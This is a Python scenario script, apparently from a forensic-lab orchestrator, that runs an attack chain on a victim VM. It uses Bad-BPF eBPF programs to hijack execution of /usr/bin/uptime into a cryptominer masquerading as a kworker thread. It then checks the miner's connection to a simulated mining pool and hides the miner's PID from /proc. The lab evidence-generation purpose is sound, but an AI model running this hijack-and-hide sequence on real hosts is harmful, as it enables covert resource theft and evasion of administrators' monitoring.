"""Run the Bad-BPF XCrypto execution-hijacking and process-hiding scenario."""

from __future__ import annotations

import socket
from collections.abc import Callable
from pathlib import Path

import yaml

from orchestrator.core import console
from orchestrator.core.provenance import file_sha256
from orchestrator.core.ssh_client import SSHClient, SSHTerminal
from scenarios.command_log import record_operation, run_logged_command

SCENARIO_ID = "kernel_ebpf_badbpf"
ROOT = Path(__file__).resolve().parent
BUILD_SCRIPT = ROOT / "files/build.sh"
LOCK = ROOT / "badbpf.lock.yml"
XCRYPTO_SOURCE = ROOT / "files/xcrypto.c"

ARTIFACT_NAMES = ("pidhide", "exechijack", "xcrypto")

_BUILDER_ARCHIVE = "/tmp/badbpf-upstream.tar.gz"
_BUILDER_SCRIPT = "/tmp/badbpf-build.sh"
_BUILDER_XCRYPTO_SOURCE = "/tmp/xcrypto.c"
_BUILDER_BUILD_ROOT = "/tmp/forensic-lab/badbpf_build"

# Victim paths
REMOTE_ROOT = "/tmp/.xcrypto"
REMOTE_PIDHIDE = f"{REMOTE_ROOT}/pidhide"
REMOTE_EXECHIJACK = f"{REMOTE_ROOT}/exechijack"
REMOTE_XCRYPTO = f"{REMOTE_ROOT}/xcrypto"
XCRYPTO_PATH = "/a"  # Hardcoded by the vendored exechijack program.
TRIGGER_PATH = "/usr/bin/uptime"
PIDHIDE_LOG = f"{REMOTE_ROOT}/pidhide.log"
EXECHIJACK_LOG = f"{REMOTE_ROOT}/exechijack.log"
MASQUERADE_NAME = "kworker/u8:2"

# Isolated host-side simulated mining pool
POOL_HOST = "192.168.100.1"
POOL_PORT = 3333
POOL_TIMEOUT = 15


def verify_source() -> dict:
    """Verify the pinned vendor archive and identify the lab-owned payload."""
    lock = yaml.safe_load(LOCK.read_text(encoding="utf-8"))
    retrieval = lock.get("retrieval", {})
    archive_filename = retrieval.get("archive_filename", "")
    archive_path = ROOT / "files" / archive_filename
    if not archive_path.exists():
        raise RuntimeError(f"bad-bpf archive not found: {archive_path}")
    archive_sha256 = file_sha256(archive_path)
    expected_sha256 = retrieval.get("archive_sha256", "")
    if archive_sha256 != expected_sha256:
        raise RuntimeError(
            "bad-bpf archive SHA-256 mismatch: "
            f"expected {expected_sha256}, got {archive_sha256}"
        )
    console.ok(f"bad-bpf source verified: {archive_sha256}")
    return {
        "repository": lock["upstream"]["url"],
        "commit": lock["upstream"]["pinned_commit"],
        "archive_sha256": archive_sha256,
        "archive_filename": archive_filename,
        "xcrypto_sha256": file_sha256(XCRYPTO_SOURCE),
    }


def build_record_is_current(record: dict, source: dict) -> bool:
    return (
        record.get("recipe", {}).get("sha256") == file_sha256(BUILD_SCRIPT)
        and record.get("source", {}).get("archive_sha256")
        == source["archive_sha256"]
        and record.get("source", {}).get("xcrypto_sha256")
        == source["xcrypto_sha256"]
    )


def build(
    ssh: SSHClient, staging: Path, source: dict
) -> tuple[tuple[Path, ...], str]:
    """Build the pinned Bad-BPF programs and XCrypto on the builder VM."""
    artifacts = tuple(staging / name for name in ARTIFACT_NAMES)
    archive = ROOT / "files" / source["archive_filename"]
    ssh.put(archive, _BUILDER_ARCHIVE)
    ssh.put(BUILD_SCRIPT, _BUILDER_SCRIPT)
    ssh.put(XCRYPTO_SOURCE, _BUILDER_XCRYPTO_SOURCE)
    console.step("building Bad-BPF and XCrypto...")
    stdout = ssh.run_checked(
        f"bash {_BUILDER_SCRIPT} {_BUILDER_ARCHIVE} {_BUILDER_BUILD_ROOT} "
        f"{_BUILDER_XCRYPTO_SOURCE}",
        timeout=1800,
    )
    for line in stdout.splitlines():
        if line.startswith("STEP "):
            console.info(line.removeprefix("STEP "))
    for name, artifact in zip(ARTIFACT_NAMES, artifacts, strict=True):
        ssh.get(f"{_BUILDER_BUILD_ROOT}/artifacts/{name}", artifact)
    return artifacts, stdout


def build_recipe() -> dict:
    """Return the exact scenario-owned build recipe recorded by the host."""
    return {"sha256": file_sha256(BUILD_SCRIPT)}


def build_target(facts: dict[str, str]) -> dict[str, str]:
    """Validate and return Bad-BPF's required target facts."""
    if not facts.get("kernel"):
        raise RuntimeError("builder reported no kernel; build not published")
    return {"kernel": facts["kernel"].strip()}


def run_badbpf(
    ssh: SSHClient,
    transcript_path: Path,
    *,
    command_log_path: Path,
    artifact_paths: tuple[Path, ...],
    build_record: dict,
) -> tuple[dict, Callable[[], None]]:
    """Hijack a routine command, start XCrypto, then hide its live worker."""
    if len(artifact_paths) != len(ARTIFACT_NAMES):
        raise RuntimeError(
            f"Expected {len(ARTIFACT_NAMES)} artifact paths, got {len(artifact_paths)}"
        )

    listener = _open_pool_listener()
    pool_connection = None

    transcript_path.touch()
    terminal = ssh.open_terminal()
    try:
        with terminal:
            _stage_artifacts(ssh, terminal, command_log_path, artifact_paths)
            guest_kernel = _preflight(terminal, command_log_path, build_record)
            worker_pid, worker_uid, worker_comm = _start_xcrypto(
                terminal, command_log_path
            )
            pool_marker, pool_reply, pool_connection, pool_facts = (
                _accept_pool_connection(listener)
            )
            record_operation(command_log_path, "validate_xcrypto_pool")
            pidhide_pid = _hide_worker(terminal, command_log_path, worker_pid)
    except BaseException:
        if pool_connection is not None:
            pool_connection.close()
        raise
    finally:
        listener.close()
        transcript_path.write_text(terminal.transcript, encoding="utf-8")

    return {
        "guest_kernel_release": guest_kernel,
        "xcrypto_path": XCRYPTO_PATH,
        "trigger_path": TRIGGER_PATH,
        "worker_pid": int(worker_pid),
        "worker_uid": int(worker_uid),
        "worker_comm": worker_comm,
        "pidhide_pid": int(pidhide_pid),
        "simulated_pool_marker": pool_marker,
        "simulated_pool_reply": pool_reply,
        "simulated_pool_connection": pool_facts,
        "pool_connection_open_at_scenario_completion": True,
        "networking_used": True,
        "backdoor_c2_used": False,
        "persistence_used": False,
    }, pool_connection.close


def _stage_artifacts(
    ssh: SSHClient,
    terminal: SSHTerminal,
    command_log_path: Path,
    artifact_paths: tuple[Path, ...],
) -> None:
    console.scope("HOST", "stage Bad-BPF and XCrypto")
    ssh.run_checked(f"mkdir -p {REMOTE_ROOT}")
    for name, artifact in zip(ARTIFACT_NAMES, artifact_paths, strict=True):
        try:
            ssh.put(artifact, f"{REMOTE_ROOT}/{name}")
        except Exception as exc:
            record_operation(command_log_path, f"upload_{name}", error=str(exc))
            raise
        record_operation(command_log_path, f"upload_{name}")
    run_logged_command(
        terminal,
        command_log_path,
        f"chmod +x {REMOTE_PIDHIDE} {REMOTE_EXECHIJACK} {REMOTE_XCRYPTO}",
        timeout=30,
    )


def _preflight(
    terminal: SSHTerminal, command_log_path: Path, build_record: dict
) -> str:
    console.scope("GUEST", "preflight checks")
    guest_kernel = run_logged_command(
        terminal, command_log_path, "uname -r", timeout=30
    ).combined_output.strip()
    expected_kernel = build_record.get("target", {}).get("kernel")
    if expected_kernel and guest_kernel != expected_kernel:
        raise RuntimeError(
            f"bad-bpf was built for kernel {expected_kernel}, guest runs {guest_kernel}"
        )
    run_logged_command(
        terminal,
        command_log_path,
        "test -r /sys/kernel/btf/vmlinux || "
        "{ echo 'BTF not available' >&2; exit 1; }",
        timeout=30,
    )
    return guest_kernel


def _start_xcrypto(
    terminal: SSHTerminal, command_log_path: Path
) -> tuple[str, str, str]:
    console.scope("GUEST", "hijack routine execution to XCrypto")
    run_logged_command(
        terminal,
        command_log_path,
        f"sudo -n install -m 0755 {REMOTE_XCRYPTO} {XCRYPTO_PATH}",
        timeout=15,
    )
    exechijack_pid = run_logged_command(
        terminal,
        command_log_path,
        f"sudo -n stdbuf -oL -eL {REMOTE_EXECHIJACK} --target-ppid $$ "
        f"> {EXECHIJACK_LOG} 2>&1 & echo $!",
        timeout=15,
    ).combined_output.splitlines()[-1].strip()
    exechijack_pid = str(int(exechijack_pid))

    run_logged_command(
        terminal,
        command_log_path,
        "_s=$SECONDS; while (( SECONDS - _s < 3 )); do :; done",
        timeout=10,
    )
    alive = run_logged_command(
        terminal,
        command_log_path,
        f"kill -0 {exechijack_pid} 2>/dev/null && echo ALIVE || echo DEAD",
        timeout=10,
    ).combined_output.strip()
    if alive != "ALIVE":
        exechijack_log = run_logged_command(
            terminal, command_log_path, f"cat {EXECHIJACK_LOG}", timeout=15
        ).combined_output.strip()
        raise RuntimeError(f"exechijack died before trigger: {exechijack_log!r}")

    worker_pid = run_logged_command(
        terminal,
        command_log_path,
        f"{TRIGGER_PATH} </dev/null >/dev/null 2>&1 & echo $!",
        timeout=15,
    ).combined_output.splitlines()[-1].strip()
    worker_pid = str(int(worker_pid))
    run_logged_command(terminal, command_log_path, "disown %%", timeout=10)
    run_logged_command(
        terminal,
        command_log_path,
        "_s=$SECONDS; while (( SECONDS - _s < 1 )); do :; done",
        timeout=10,
    )
    run_logged_command(
        terminal,
        command_log_path,
        f"kill {exechijack_pid} 2>/dev/null; "
        f"wait {exechijack_pid} 2>/dev/null || true",
        timeout=10,
    )
    exechijack_log = run_logged_command(
        terminal,
        command_log_path,
        f"cat {EXECHIJACK_LOG}",
        timeout=15,
    ).combined_output.strip()
    worker_identity = run_logged_command(
        terminal,
        command_log_path,
        f"while read -r key value rest; do "
        f"[[ $key == Uid: ]] && printf '%s ' \"$value\" && break; "
        f"done < /proc/{worker_pid}/status; "
        f"IFS= read -r -d '' argv0 < /proc/{worker_pid}/cmdline || true; "
        f"read -r comm < /proc/{worker_pid}/comm; "
        f"printf '%s | %s\\n' \"$argv0\" \"$comm\"",
        timeout=15,
    ).combined_output.strip()

    fields = worker_identity.split()
    if (
        len(fields) != 4
        or not fields[0].isdigit()
        or fields[1:] != [TRIGGER_PATH, "|", MASQUERADE_NAME]
        or f"Hijacked PID {worker_pid}" not in exechijack_log
        or f"instead of '{TRIGGER_PATH}'" not in exechijack_log
    ):
        raise RuntimeError(
            f"XCrypto execution hijack failed: {worker_identity!r}; "
            f"log: {exechijack_log!r}"
        )
    return worker_pid, fields[0], fields[3]


def _open_pool_listener() -> socket.socket:
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        listener.bind((POOL_HOST, POOL_PORT))
        listener.listen(1)
        listener.settimeout(POOL_TIMEOUT)
        return listener
    except OSError as exc:
        listener.close()
        raise RuntimeError(
            f"Could not open XCrypto pool simulator on {POOL_HOST}:{POOL_PORT}: {exc}"
        ) from exc


def _accept_pool_connection(
    listener: socket.socket,
) -> tuple[str, str, socket.socket, dict]:
    console.scope("HOST", "validate simulated mining-pool connection")
    connection = None
    try:
        connection, _address = listener.accept()
        connection.settimeout(POOL_TIMEOUT)
        marker = connection.recv(4096).decode(errors="replace").strip()
        expected = (
            '{"id":1,"method":"mining.subscribe",'
            '"params":["xcrypto/1.0"]}'
        )
        if marker != expected:
            raise RuntimeError(f"Unexpected XCrypto pool marker: {marker!r}")
        reply = '{"id":1,"result":[["mining.notify","xcrypto"]],"error":null}'
        connection.sendall(f"{reply}\n".encode())
        console.ok("XCrypto connected to pool simulator")
        return marker, reply, connection, {
            "client": list(connection.getpeername()),
            "server": list(connection.getsockname()),
        }
    except OSError as exc:
        if connection is not None:
            connection.close()
        raise RuntimeError(f"XCrypto pool connection failed: {exc}") from exc
    except BaseException:
        if connection is not None:
            connection.close()
        raise


def _hide_worker(
    terminal: SSHTerminal, command_log_path: Path, worker_pid: str
) -> str:
    console.scope("GUEST", "hide the connected XCrypto worker")
    visible = run_logged_command(
        terminal,
        command_log_path,
        f"ls /proc | grep -x '{worker_pid}' && echo VISIBLE || echo MISSING",
        timeout=15,
    ).combined_output
    if "VISIBLE" not in visible:
        raise RuntimeError(f"XCrypto worker {worker_pid} was not visible before hiding")

    executable = run_logged_command(
        terminal,
        command_log_path,
        f"readlink /proc/{worker_pid}/exe",
        timeout=15,
    ).combined_output.strip()
    if executable != XCRYPTO_PATH:
        raise RuntimeError(
            f"XCrypto worker executable is {executable!r}, expected {XCRYPTO_PATH!r}"
        )

    pidhide_pid = run_logged_command(
        terminal,
        command_log_path,
        f"sudo -n nohup stdbuf -oL -eL {REMOTE_PIDHIDE} "
        f"--pid-to-hide {worker_pid} </dev/null > {PIDHIDE_LOG} 2>&1 & echo $!",
        timeout=15,
    ).combined_output.splitlines()[-1].strip()
    pidhide_pid = str(int(pidhide_pid))
    run_logged_command(terminal, command_log_path, "disown %%", timeout=10)
    run_logged_command(terminal, command_log_path, "sleep 2", timeout=10)

    alive = run_logged_command(
        terminal,
        command_log_path,
        f"kill -0 {worker_pid} 2>/dev/null && "
        f"kill -0 {pidhide_pid} 2>/dev/null && echo ALIVE || echo DEAD",
        timeout=10,
    ).combined_output.strip()
    hidden = run_logged_command(
        terminal,
        command_log_path,
        f"ls /proc | grep -x '{worker_pid}' && echo VISIBLE || echo HIDDEN",
        timeout=15,
    ).combined_output.strip()
    direct_status = run_logged_command(
        terminal,
        command_log_path,
        f"sed -n '1,2p' /proc/{worker_pid}/status",
        timeout=15,
    ).combined_output.strip()
    run_logged_command(
        terminal,
        command_log_path,
        f"tail -5 {PIDHIDE_LOG} 2>/dev/null || true",
        timeout=15,
    )
    if alive != "ALIVE" or "HIDDEN" not in hidden or not direct_status:
        raise RuntimeError(
            f"XCrypto concealment failed: alive={alive!r}, hidden={hidden!r}, "
            f"status={direct_status!r}"
        )
    return pidhide_pid
